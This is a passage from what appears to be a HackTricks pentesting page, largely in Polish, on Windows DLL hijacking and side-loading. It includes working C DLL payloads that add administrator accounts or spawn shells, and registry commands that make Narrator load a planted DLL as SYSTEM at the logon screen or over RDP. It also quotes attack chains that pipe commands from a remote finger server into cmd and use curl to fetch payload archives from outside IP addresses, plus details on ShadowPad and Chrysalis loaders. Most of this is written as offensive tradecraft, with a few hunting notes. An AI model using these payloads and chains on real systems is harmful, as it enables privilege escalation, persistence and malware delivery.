// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL języka C z punktem wejścia wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: DLL Hijack lokalizacji Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe nadal podczas uruchamiania sprawdza przewidywalną, zależną od języka DLL lokalizacyjną, którą można przejąć w celu arbitrary code execution i persistence.<sup>[[7]](#references)</sup>

Najważniejsze fakty
- Ścieżka sprawdzana (obecne buildy): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Ścieżka legacy (starsze buildy): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore istnieje zapisywalna DLL kontrolowana przez atakującego, zostanie załadowana, a `DllMain(DLL_PROCESS_ATTACH)` zostanie wykonane. Eksporty nie są wymagane.

Discovery za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i zaobserwuj próbę załadowania powyższej ścieżki.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Cisza OPSEC
- Naiwny hijack będzie aktywował/podświetlał UI. Aby zachować ciszę, podczas attach wylicz wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajduje się w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i persistence przez konfigurację Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Po wykonaniu powyższych poleceń uruchomienie Narrator ładuje umieszczoną DLL. Na secure desktop (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.

Wykonanie SYSTEM wyzwalane przez RDP (lateral movement)
- Zezwól na klasyczną warstwę bezpieczeństwa RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzymuje się po zamknięciu sesji RDP — wykonaj inject/migrate niezwłocznie.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego Accessibility Tool (AT), np. CursorIndicator, edytować go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. W ten sposób proxy'ujesz dowolne wykonanie w ramach frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są wymagane.

## Studium przypadku: CVE-2025-1729 — Privilege Escalation Using TPQMAssistant.exe

Ten przypadek pokazuje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Zapisywalny przez `CREATOR OWNER`, co pozwala lokalnym użytkownikom umieszczać dowolne pliki.
- **Zachowanie wyszukiwania DLL**: Próbuje najpierw załadować `hostfxr.dll` z katalogu roboczego i zapisuje „NAME NOT FOUND”, jeśli pliku brakuje, co wskazuje na pierwszeństwo wyszukiwania w lokalnym katalogu.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania code execution w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli w momencie wykonania zadania zalogowany jest administrator, złośliwy DLL zostanie uruchomiony w sesji administratora ze średnim poziomem integralności.
4. Połącz standardowe techniki obejścia UAC, aby podnieść uprawnienia ze średniego poziomu integralności do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading za pośrednictwem Signed Host (wsc_proxy.exe)

Threat actors często łączą droppers oparte na MSI z DLL side-loading, aby wykonywać payloady w ramach zaufanego, podpisanego procesu.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. akcja LaunchApplication lub VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje legalny, podpisany EXE oraz złośliwy DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego EXE mechanizm wyszukiwania DLL systemu Windows ładuje najpierw wsc.dll z katalogu roboczego, wykonując kod atakującego w ramach podpisanego procesu nadrzędnego (ATT&CK T1574.001).

Analiza MSI (czego szukać)
- Tabela CustomAction:
- Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication wykonujący osadzony plik w tle.
- W Orca (Microsoft Orca.exe) przeanalizuj tabele CustomAction, InstallExecuteSequence oraz Binary.
- Osadzone/podzielone payloady w MSI CAB:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Możesz też użyć lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction VBScript. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading z użyciem wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekieruj wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- For export requirements, use a proxying framework (e.g., DLLirant/Spartacus) to generate a forwarding DLL that also executes your payload.

- This technique relies on DLL name resolution by the host binary. If the host uses absolute paths or safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack may fail.
- KnownDLLs, SxS, and forwarded exports can influence precedence and must be considered during selection of the host binary and export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point described how Ink Dragon deploys ShadowPad using a **three-file triad** to blend in with legitimate software while keeping the core payload encrypted on disk:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). The attackers rename the executable to look like a Windows binary (for example `conhost.exe`), but the Authenticode signature remains valid.
2. **Malicious loader DLL** – dropped next to the EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). The DLL is usually an MFC binary obfuscated with the ScatterBrain framework; its only job is to locate the encrypted blob, decrypt it, and reflectively map ShadowPad.
3. **Encrypted payload blob** – often stored as `<name>.tmp` in the same directory. After memory-mapping the decrypted payload, the loader deletes the TMP file to destroy forensic evidence.

Tradecraft notes:

* Renaming the signed EXE (while keeping the original `OriginalFileName` in the PE header) lets it masquerade as a Windows binary yet retain the vendor signature, so replicate Ink Dragon’s habit of dropping `conhost.exe`-looking binaries that are really AMD/NVIDIA utilities.
* Because the executable stays trusted, most allowlisting controls only need your malicious DLL to sit alongside it. Focus on customizing the loader DLL; the signed parent can typically run untouched.
* ShadowPad’s decryptor expects the TMP blob to live next to the loader and be writable so it can zero the file after mapping. Keep the directory writable until the payload loads; once in memory the TMP file can safely be deleted for OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators pair DLL sideloading with LOLBAS so the only custom artifact on disk is the malicious DLL next to the trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell spawns `cmd.exe /c`, pulls commands from a Finger server, and pipes them to `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pulls TCP/79 text; `| cmd` executes the server response, letting operators rotate second stage server-side.

- **Built-in download/extract:** Download an archive with a benign extension, unpack it, and stage the sideload target plus DLL under a random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` hides progress and follows redirects; `tar -xf` uses Windows' built-in tar.

- **WMI/CIM launch:** Start the EXE via WMI so telemetry shows a CIM-created process while it loads the colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Works with binaries that prefer local DLLs (e.g., `intelbq.exe`, `nearby_share.exe`); payload (e.g., Remcos) runs under the trusted name.

- **Hunting:** Alert on `forfiles` when `/p`, `/m`, and `/c` appear together; uncommon outside admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

A recent Lotus Blossom intrusion abused a trusted update chain to deliver an NSIS-packed dropper that staged a DLL sideload plus fully in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS) creates `%AppData%\Bluetooth`, marks it **HIDDEN**, drops a renamed Bitdefender Submission Wizard `BluetoothService.exe`, a malicious `log.dll`, and an encrypted blob `BluetoothService`, then launches the EXE.
- The host EXE imports `log.dll` and calls `LogInit`/`LogWrite`. `LogInit` mmap-loads the blob; `LogWrite` decrypts it with a custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, key material derived from a prior hash), overwrites the buffer with plaintext shellcode, frees temps, and jumps to it.
- To avoid an IAT, the loader resolves APIs by hashing export names using **FNV-1a basis 0x811C9DC5 + prime 0x100019**, then applying a Murmur-style avalanche (**0x85EBCA6B**) and comparing against salted target hashes.

Main shellcode (Chrysalis)
- Decrypts a PE-like main module by repeating add/XOR/sub with key `gQ2JR&9;` over five passes, then dynamically loads `Kernel32.dll` → `GetProcAddress` to finish import resolution.
- Reconstructs DLL name strings at runtime via per-character bit-rotate/XOR transforms, then loads `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Uses a second resolver that walks the **PEB → InMemoryOrderModuleList**, parses each export table in 4-byte blocks with Murmur-style mixing, and only falls back to `GetProcAddress` if the hash is not found.

Embedded configuration & C2
- Config lives inside the dropped `BluetoothService` file at **offset 0x30808** (size **0x980**) and is RC4-decrypted with key `qwhvb^435h&*7`, revealing the C2 URL and User-Agent.
- Beacons build a dot-delimited host profile, prepend tag `4Q`, then RC4-encrypt with key `vAuig34%^325hGV` before `HttpSendRequestA` over HTTPS. Responses are RC4-decrypted and dispatched by a tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode is gated by CLI args: no args = install persistence (service/Run key) pointing to `-i`; `-i` relaunches self with `-k`; `-k` skips install and runs payload.

Alternate loader observed
- The same intrusion dropped Tiny C Compiler and executed `svchost.exe -nostdlib -run conf.c` from `C:\ProgramData\USOShared\`, with `libtcc.dll` beside it. The attacker-supplied C source embedded shellcode, compiled, and ran in-memory without touching the disk with a PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten etap kompilacji i uruchamiania oparty na TCC importował `Wininet.dll` w czasie działania i pobierał second-stage shellcode z hardcoded URL, zapewniając elastyczny loader, który podszywał się pod uruchomienie kompilatora.

## Sideloading przez signed host z export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostał aktywny wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu malicious DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Umieść zaufany EXE obok malicious DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Malicious DLL **proxy'uje każdy oczekiwany export** do prawdziwej systemowej DLL, na przykład `%SystemRoot%\\System32\\version.dll`, dzięki czemu import resolution nadal działa, a host process może kontynuować pracę.
- Po załadowaniu malicious DLL **patchuje entry point hosta**, aby main thread przechodził do nieskończonej pętli `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby process.
- Nowy thread wykonuje właściwe malicious work: odszyfrowuje nazwę lub ścieżkę next-stage DLL (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Why this matters
- Standardowe DLL proxying zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla kolejnych etapów.
- Umieszczenie main thread w `Sleep(INFINITE)` to prosty sposób na utrzymanie signed process w pamięci, podczas gdy loader wykonuje deszyfrowanie, staging lub network bootstrap w worker thread.
- Hunting wyłącznie pod kątem podejrzanego `DllMain` może pominąć ten pattern, jeśli interesujące zachowanie występuje dopiero po spatchowaniu host entry point i uruchomieniu secondary thread.

Minimal workflow
1. Skopiuj signed host EXE i ustal, którą DLL ładuje on z local directory.
2. Zbuduj proxy DLL eksportującą te same functions i przekazującą je do legitimate DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz worker thread.
4. Z tego threadu spatchuj host entry point lub main thread start routine, tak aby wykonywał pętlę opartą na `Sleep`.
5. Odszyfruj nazwę/config next-stage DLL i wywołaj `LoadLibrary` albo wykonaj manual-map payloadu.

Defensive pivots
- Signed processes ładujące `version.dll` lub podobne common libraries z własnego application directory zamiast z `System32`.
- Memory patches w process entry point krótko po image load, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Threads tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej DLL z odszyfrowaną nazwą.
- Full-export proxy DLL umieszczane obok vendor executables w writable staging directories, takich jak `ProgramData`, `%TEMP%` lub ścieżki wypakowanych archiwów.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Simple C example.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
